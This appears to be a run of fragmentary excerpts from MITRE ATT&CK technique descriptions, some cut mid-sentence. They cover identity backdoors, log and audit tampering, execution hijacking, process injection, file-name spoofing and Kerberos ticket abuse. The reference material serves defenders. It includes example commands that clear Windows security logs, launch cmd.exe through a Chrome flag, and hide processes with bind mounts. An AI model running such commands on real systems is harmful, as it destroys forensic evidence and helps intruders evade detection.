        processes that are tied to on-premises user identities in order to bypass
        typical authentication mechanisms, access credentials, and enable persistent
        access to accounts.  \n\nMany organizations maintain hybrid user and device
        identities that are shared between on-premises and cloud-based environments.
        These can be maintained in a number of ways. For example, Microsoft Entra
        ID includes three options for synchronizing identities between Active Directory
        and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization
        (PHS), in which a privileged on-premises account synchronizes user password
        hashes between Active Directory and Entra ID, allowing authentication to Entra
        ID to take place entirely in the cloud \n* Pass Through Authentication (PTA),
        in which Entra ID authentication attempts are forwarded to an on-premises
        PTA agent, which validates the credentials against Active Directory \n* Active
        Directory Federation Services (AD FS), in which a trust relationship is established
        between Active Directory and Entra ID \n\nAD FS can also be used with other
        SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication
        process to AD FS and receive a token containing the hybrid users’ identity
        and privileges. \n\nBy modifying authentication processes tied to hybrid identities,
        an adversary may be able to establish persistent privileged access to cloud
        resources. For example, adversaries who compromise an on-premises server running
        a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService`
        process that authorizes all attempts to authenticate to Entra ID, as well
        as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation:
        AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary
        may edit the `Microsoft.IdentityServer.Servicehost` configuration file to
        load a malicious DLL that generates authentication tokens for any user with
        any set of claims, thereby bypassing multi-factor authentication and defined
        AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able
        to modify the hybrid identity authentication process from the cloud. For example,
        adversaries who compromise a Global Administrator account in an Entra ID tenant
        may be able to register a new PTA agent via the web console, similarly allowing
        them to harvest credentials and log into the Entra ID environment as any user.(Citation:
        Mandiant Azure AD Backdoors)"

        Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)

        Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c calc.exe`).(Citation: Electron 6-8)

        Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)

      description: |-
        Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.

        Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)

        With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)

      description: |-
        Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

        Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

        This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.

        Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.

        Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.

        The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)

        The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.

        Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)

      name: 'Hijack Execution Flow: Path Interception by Search Order Hijacking'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

        Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

        For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net user</code>. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)

        Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).

      name: Unused/Unsupported Cloud Regions
      description: |-
        Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.

        Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.

        A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.

        An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)

      name: Bind Mounts
      description: "Adversaries may abuse bind mounts on file structures to hide their
        activity and artifacts from native utilities. A bind mount maps a directory
        or file from one location on the filesystem to another, similar to a shortcut
        on Windows. It’s commonly used to provide access to specific files or directories
        across different environments, such as inside containers or chroot environments,
        and requires sudo access. \n\nAdversaries may use bind mounts to map either
        an empty directory or a benign `/proc` directory to a malicious process’s
        `/proc` directory. Using the commands `mount –o bind /proc/benign-process
        /proc/malicious-process` (or `mount –B`), the malicious process's `/proc`
        directory is overlayed with the contents of a benign process's `/proc` directory.
        When system utilities query process activity, such as `ps` and `top`, the
        kernel follows the bind mount and presents the benign directory’s contents
        instead of the malicious process's actual `/proc` directory. As a result,
        these utilities display information that appears to come from the benign process,
        effectively hiding the malicious process's metadata, executable, or other
        artifacts from detection.(Citation: Cado Security Commando Cat 2024)(Citation:

      description: "Adversaries may modify Group Policy Objects (GPOs) to subvert
        the intended discretionary access controls for a domain, usually with the
        intention of escalating privileges on the domain. Group policy allows for
        centralized management of user and computer settings in Active Directory (AD).
        GPOs are containers for group policy settings made up of files stored within
        a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation:
        TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike
        other objects in AD, GPOs have access controls associated with them. By default
        all user accounts in the domain have permission to read GPOs. It is possible
        to delegate GPO access control permissions, e.g. write access, to specific
        users or groups in the domain.\n\nMalicious GPO modifications can be used
        to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),
        [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001),
        [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create

        to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends
        2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many
        user and machine settings in the AD environment, there are a great number
        of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide
        to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code>
        can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)
        by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation:
        Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases
        an adversary might modify specific user rights like SeEnableDelegationPrivilege,
        set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>,
        to achieve a subtle AD backdoor with complete control of the domain because
        the user account under the adversary's control would then be able to modify
        GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)"

        Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

        Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)

        Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)

      name: 'Hijack Execution Flow: LD_PRELOAD'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)

        Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)

        Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.

      description: |-
        Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.


        With administrator privileges, the event logs can be cleared with the following utility commands:

        * <code>wevtutil cl system</code>
        * <code>wevtutil cl application</code>
        * <code>wevtutil cl security</code>

        These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)

        Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.

        to evade access control lists (ACLs) and access protected files.(Citation:
        Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)
        File and directory permissions are commonly managed by ACLs configured by
        the file or directory owner, or users with the appropriate permissions. File
        and directory ACL implementations vary by platform, but generally explicitly
        designate which users or groups can perform which actions (read, write, execute,
        etc.).\n\nModifications may include changing specific access rights, which
        may require taking ownership of a file or directory and/or elevated permissions
        depending on the file or directory’s existing permissions. This may enable
        malicious activity such as modifying, replacing, or deleting specific files
        or directories. Specific file and directory modifications may be a required
        step for many techniques, such as establishing Persistence via [Accessibility
        Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization
        Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration

        other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries
        may also change permissions of symbolic links. For example, malware (particularly
        ransomware) may modify symbolic links and associated settings to enable access
        to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation:

        Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

        Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.

        While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.

      name: 'Abuse Elevation Control Mechanism: Setuid and Setgid'
      description: |-
        An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

        Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

        Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a "shell escape" or other actions to bypass an execution environment with restricted permissions.

        Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)

      name: Temporary Elevated Cloud Access
      description: "Adversaries may abuse permission configurations that allow them
        to gain temporarily elevated access to cloud resources. Many cloud environments
        allow administrators to grant user or service accounts permission to request
        just-in-time access to roles, impersonate other accounts, pass roles onto
        resources and services, or otherwise gain short-term access to a set of privileges
        that may be distinct from their own. \n\nJust-in-time access is a mechanism
        for granting additional roles to cloud accounts in a granular, temporary manner.
        This allows accounts to operate with only the permissions they need on a daily
        basis, and to request additional permissions as necessary. Sometimes just-in-time
        access requests are configured to require manual approval, while other times
        the desired permissions are automatically granted.(Citation: Azure Just in
        Time Access 2023)\n\nAccount impersonation allows user or service accounts
        to temporarily act with the permissions of another account. For example, in
        GCP users with the `iam.serviceAccountTokenCreator` role can create temporary
        access tokens or sign arbitrary payloads with the permissions of a service
        account, while service accounts with domain-wide delegation permission are
        permitted to impersonate Google Workspace accounts.(Citation: Google Cloud
        Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation
        Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation:
        Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange
        Online, the `ApplicationImpersonation` role allows a service account to use
        the permissions associated with specified user accounts.(Citation: Microsoft
        Impersonation and EWS in Exchange) \n\nMany cloud environments also include
        mechanisms for users to pass roles to resources that allow them to perform
        tasks and authenticate to other services. While the user that creates the
        resource does not directly assume the role they pass to it, they may still
        be able to take advantage of the role's access -- for example, by configuring
        the resource to perform certain actions with the permissions it has been granted.
        In AWS, users with the `PassRole` permission can allow a service they create
        to assume a given role, while in GCP, users with the `iam.serviceAccountUser`
        role can attach a service account to a resource.(Citation: AWS PassRole)(Citation:
        Google Cloud Service Account Authentication Roles)\n\nWhile users require
        specific role assignments in order to use any of these features, cloud administrators
        may misconfigure permissions. This could result in escalation paths that allow
        adversaries to gain access to resources beyond what was originally intended.(Citation:
        Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS
        Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional
        Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves
        assigning permanent roles to accounts rather than abusing existing permissions
        structures to gain temporarily elevated access to resources. However, adversaries
        that compromise a sufficiently privileged account may grant another account
        they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)
        that would allow them to also abuse these features. This may also allow for
        greater stealth than would be had by directly using the highly privileged
        account, especially when logs do not clarify when role impersonation is taking
        place.(Citation: CrowdStrike StellarParticle January 2022)"

      description: "Adversaries may inject malicious code into process via process
        doppelgänging in order to evade process-based defenses as well as possibly
        elevate privileges. Process doppelgänging is a method of executing arbitrary
        code in the address space of a separate live process. \n\nWindows Transactional
        NTFS (TxF) was introduced in Vista as a method to perform safe file operations.
        (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted
        handle to write to a file at a given time. Until the write handle transaction
        is terminated, all other handles are isolated from the writer and may only
        read the committed version of the file that existed at the time the handle
        was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption,
        TxF performs an automatic rollback if the system or application fails during
        a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated,
        the TxF application programming interface (API) is still enabled as of Windows
        10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may
        abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055).
        Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),
        process doppelgänging involves replacing the memory of a legitimate process,
        enabling the veiled execution of malicious code that may evade defenses and
        detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored
        API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>,
        and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging
        Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat
        Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction
        using a legitimate executable then overwrite the file with malicious code.
        These changes will be isolated and only visible within the context of the
        transaction.\n* Load – Create a shared section of memory and load the malicious
        executable.\n* Rollback – Undo changes to original executable, effectively
        removing malicious code from the file system.\n* Animate – Create a process
        from the tainted section of memory and initiate execution.\n\nThis behavior
        will likely not result in elevated privileges since the injected process was
        spawned from (and thus inherits the security context) of the injecting process.
        However, execution via process doppelgänging may evade detection from security
        products since the execution is masked under a legitimate process. "

      name: Executable Installer File Permissions Weakness
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

      description: "An adversary may attempt to block indicators or events typically
        captured by sensors from being gathered and analyzed. This could include maliciously
        redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based
        sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About
        Event Tracing 2018), by tampering settings that control the collection and
        flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These
        settings may be stored on the system in configuration files and/or in the
        Registry as well as being accessible via administrative utilities such as
        [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management
        Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example,
        adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code>
        to hide their malicious actions in a new or different .evtx log file. This
        action does not require a system reboot and takes effect immediately.(Citation:
        disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways,
        however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001)
        <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the
        Registry to make alterations.\n\nIn the case of network-based reporting of
        indicators, an adversary may block traffic associated with reporting to prevent
        central analysis. This may be accomplished by many means, such as stopping
        a local process responsible for forwarding telemetry and/or creating a host-based
        firewall rule to block traffic to specific hosts responsible for aggregating
        events, such as security information and event management (SIEM) products.\n\nIn
        Linux environments, adversaries may disable or reconfigure log processing
        tools such as syslog or nxlog to inhibit detection and monitoring capabilities
        to facilitate follow on behaviors. (Citation: LemonDuck) ESXi also leverages
        syslog, which can be reconfigured via commands such as `esxcli system syslog
        config set` and `esxcli system syslog config reload`.(Citation: Google Cloud

      description: |-
        Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`,  `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`, `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper and Spotlight.(Citation: Establishing persistence using extended attributes on Linux)

        An adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the `xattr` command. A separate loader can retrieve the attribute with `xattr -p`, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use `setfattr` to write a payload into the `user.` namespace of a legitimate file. A loader script can later extract the payload with `getfattr --only-values`, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.(Citation: Low GroupIB xattrs nov 2024)

        An adversary with appropriate permissions may introduce new firewall rules

      description: |-
        Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)

        Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.

      description: |-
        Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

        Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.

      description: |-
        Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

        When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

        A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

        A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

        Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)

      description: "Adversaries may inject malicious code into processes via the asynchronous
        procedure call (APC) queue in order to evade process-based defenses as well
        as possibly elevate privileges. APC injection is a method of executing arbitrary
        code in the address space of a separate live process. \n\nAPC injection is
        commonly performed by attaching malicious code to the APC Queue (Citation:
        Microsoft APC) of a process's thread. Queued APC functions are executed when
        the thread enters an alterable state.(Citation: Microsoft APC) A handle to
